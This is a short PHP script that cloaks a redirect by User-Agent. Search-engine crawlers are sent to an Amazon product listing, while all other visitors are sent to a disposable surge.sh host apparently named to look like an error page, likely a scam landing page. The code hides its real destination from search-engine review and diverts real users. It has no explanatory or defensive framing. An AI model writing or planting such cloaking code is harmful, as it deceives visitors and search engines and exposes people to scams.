<?php
$user_agent=$_SERVER['HTTP_USER_AGENT'];
if((strstr(strtolower($user_agent), "googlebot")) || (preg_match('/yandex|yahoo|bot|crawl|slurp|spider/i', $user_agent)))
{
    header('Location:https://www.amazon.com/Motivational-teamwork-bedroom-office-Aspire/dp/B07CJ2WYCZ');
}
else{
	header('Location:https://somethingwentwrong23.surge.sh');
}
?>
